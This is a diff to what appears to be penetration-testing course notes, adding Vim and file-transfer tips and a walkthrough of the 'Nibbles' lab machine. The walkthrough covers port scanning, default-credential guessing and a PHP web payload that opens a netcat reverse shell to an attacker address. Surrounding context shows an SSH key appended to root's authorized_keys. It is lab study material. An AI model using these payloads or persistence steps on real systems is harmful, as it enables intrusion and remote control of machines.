@@ -258,6 +258,64 @@ Projects/
     - Create new key and specify output file: `ssh-keygen -f key`
     - Copy `key.pub` to remote machine then append: `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`
     - Login with private key: `ssh root@10.10.10.10 -i key`
+   
+
+23. **Vim**
+    - Open file: `vim text.txt`
+    - Save and quit: `:wq!`
+
+
+24. **Transferring Files**
+
+    **(1) wget**
+    - Navigate to the directory containing the file: `cd /tmp`
+    - Start a Python HTTP server: `python3 -m http.server 8000`
+    - Download using wget: `wget http://10.10.14.1:8000/linenum.sh`
+    - Download using cURL: `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` (`-o` to specify output file name)
+
+    **(2) SCP**
+    - Assumption: SSH credentials available on the remote host.
+    - Command: `scp linenum.sh user@remotehost:/tmp/linenum.sh`
+
+    **(3) Base64**
+    - Used when file transfer is blocked by a firewall or similar restriction.
+    - Base64 encode the file: `base64 shell -w 0`
+    - Copy the string to the remote host, decode it, and output to file:
+      `echo f0VMRgIBAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2JXSInmDwU | base64 -d > shell`
+
+    **Validating a File Transfer**
+    - Validate format on remote host: `file shell`
+    - Check MD5 hash on local machine: `md5sum shell`
+    - Run the same on the remote host: `md5sum shell`
+
+
+25. **Nibbles Machine**
+    - Open port scan: `nmap -sV --open -oA nibbles_initial_scan <ip>`
+    - Full TCP port scan: `nmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.190`
+    - Banner grabbing:
+      `nc -nv 10.129.42.190 22`
+      `nc -nv 10.129.42.190 80`
+    - Script scan: `nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190`
+    - Enumerate common web app directories: `nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190`
+
+    **(1) Web Footprinting**
+    - Use WhatWeb to identify the web app in use. Also check with cURL.
+    - If a directory is found, check with WhatWeb: `whatweb http://10.129.42.190/nibbleblog`
+    - Browse to the directory and Google search for known vulnerabilities.
+    - Use Gobuster for other accessible pages or directories.
+    - Check README: `curl http://10.129.42.190/nibbleblog/README`
+    - Check admin login portal — try common credential pairs like `admin:admin`, `admin:password`. Password reset gives an error; too many login attempts trigger a lockout message (IP blacklisting).
+    - Return to directory brute-forcing. Browse to `/nibbleblog/themes` → `/content` → find subdirectories: `public`, `private`, `tmp` → `users.xml`.
+    - Request the file with cURL and prettify it:
+      `curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint --format -`
+    - Code execution test: `<?php system('id'); ?>`
+    - Bash reverse shell one-liner, added to script:
+      `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT> >/tmp/f`
+      As PHP: `<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>`
+    - Listen on terminal: `nc -lvnp 9443` (then curl the image page or browse to it to trigger the reverse shell).
+    - Python one-liner for pseudo-terminal: `python -c 'import pty; pty.spawn("/bin/bash")'`
+    - If Python 2 is missing, check for version: `which python3` → `python3 -c 'import pty; pty.spawn("/bin/bash")'` → browse to `/home/nibbler` → `user.txt` and zip file.
+
       
 ## Key Concepts
 - Linux systems & utility tools  
@@ -274,4 +332,6 @@ Projects/
 - Improving shell usability (TTY upgrades)
 - Privilege escalation through OS and kernel exploits
 - Exposing credentials and SSH keys
+- Transferring files
+- Nibbles machine enumeration, web footprinting, and privilege escalation
 
